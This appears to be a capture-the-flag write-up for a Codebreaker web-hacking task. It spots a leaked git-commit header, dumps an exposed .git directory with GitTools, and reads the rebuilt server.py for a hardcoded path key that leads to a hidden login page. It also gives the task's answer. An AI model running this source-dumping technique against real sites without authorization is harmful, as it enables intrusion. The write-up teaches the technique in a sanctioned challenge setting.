<!-- HEADER -->
<div align="center">

# [\[<<\]](../TaskB1/) Task B2 - Getting Deeper [\[>>\]](../Task5/)
![Category: Web Hacking, [redacted]](https://img.shields.io/badge/Category-Web_Hacking,_\[redacted\]-informational?style=flat-square)
![Points: 100](https://img.shields.io/badge/Points-100-43853D?style=flat-square)

![Task Screenshot](https://i.imgur.com/D4uPJUN.png)

</div>

<!-- DESCRIPTION -->
> It looks like the backend site you discovered has some security features to prevent you from snooping. They must have hidden the login page away somewhere hard to guess.
> 
> Analyze the backend site, and find the URL to the login page.
> 
> *Hint: this group seems a bit sloppy. They might be exposing more than they intend to.*
> 
> ---
>
> **Warning:** Forced-browsing tools, such as DirBuster, are unlikely to be very helpful for this challenge, and may get your IP address automatically blocked by AWS as a DDoS-prevention measure. Codebreaker has no control over this blocking, so we suggest not attempting to use these techniques.
> 
> ---
>
> Enter the URL for the login page
> ```
> ```

## Files
* [provided/](provided/)
	- (empty)
* [repo/](./repo) - Extracted repository of the backend site.
	- [app/](./repo/app/)
		- [server.py](./repo/app/server.py) - The main python script that controls the site.
		- (more files, snipped)
	- (more files, snipped)

<!-- BREAKDOWN & SOLUTION -->
## Breakdown & Solution

Using the domain we got from the [previous task](../TaskB1/), lets what the backend site is doing.

That's not fun.

![Backend Site](https://i.imgur.com/zjB71gg.png)

Lets check the network traffic. Hm nothing here, but I can see that we have a `x-git-commit-hash` header in the response!

![Network Traffic](https://i.imgur.com/2RACfQB.png)

Lets see if there's a `.git` directory:

![Git Directory](https://i.imgur.com/oMUofAT.png)

We didn't get an error `404` so that means its there! Check if we can get the files in the `.git` directory:

![Git Files](https://i.imgur.com/dHvOZAL.png)

Success! Lets download use a tool called [GitTools](https://github.com/internetwache/GitTools) to extract all the files in the `.git` directory. From there we can rebuild the entire repository.

Download the tool

```
$ git clone https://github.com/internetwache/GitTools.git && cd GitTools
Cloning into 'GitTools'...
... (snipped)
```

Dump the .git directory
```
$ ./Dumper/gitdumper.sh https://xsafjadfhngjqmit.ransommethis.net/.git/ git_dump
[*] Destination folder does not exist
[+] Creating git_dump/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
... (snipped)
```

From the git dump, extract the files and rebuild the repository.

```
$ ./Extractor/extractor.sh git_dump/ ../repo/
[*] Destination folder does not exist
[*] Creating...
[+] Found commit: 1ef040a115beb615d1d55f098a3dcc9dd13d0149
... (snipped)
```

And clean everything up

```
$ cd .. && rm -r GitTools
```

And we got the [entire repository](./repo)!

Lets take a look at [server.py](./repo/app/server.py), we can see here that there's a function called `expected_pathkey`
```py 
def expected_pathkey():
	return "sfukthmjthqxfjdy"
```

If we continue to look at the code, we see where that function is used:

```py
def pathkey_route(pathkey, path):
	if pathkey.endswith('/'):
		# Deal with weird normalization
		pathkey = pathkey[:-1]
		path = '/' + path

	# Super secret path that no one will ever guess!
	if pathkey != expected_pathkey():
		return render_template('unauthorized.html'), 403
	# Allow access to the login page, even if they're not logged in
	if path == 'login':
		return loginpage()
```

That means if we want to not get 403'd we need to do `sfukthmjthqxfjdy/blah`, and in the [templates/](./repo/app/templates/) folder we see all the different pages we can go to, in this case we can see [login.html](./repo/app/templates/login.html).

Lets try going to `https://xsafjadfhngjqmit.ransommethis.net/sfukthmjthqxfjdy/login`

![Login Page](https://i.imgur.com/hB62cXE.png)

Nice we got it! Lets submit `https://xsafjadfhngjqmit.ransommethis.net/sfukthmjthqxfjdy/login`.

![Task Screenshot](https://i.imgur.com/fujHhHk.png)

We got the login url!

> ```
> Well found! Now we need to log in...
> ```

<!-- TL;DR -->
## Technical TL;DR
Check the requests you make and you'll find a git-commit hash in the response. This shows that the attackers may have leaked their .git directory. Use a tool to go through the .git directory and reverse the repository to get the source code of the website. From there you can find the login page by looking at the source code of the server handler which shows that it only allows you to access pages give you give a pathkey.

---

<div align="center">

[return to top](#top)

</div>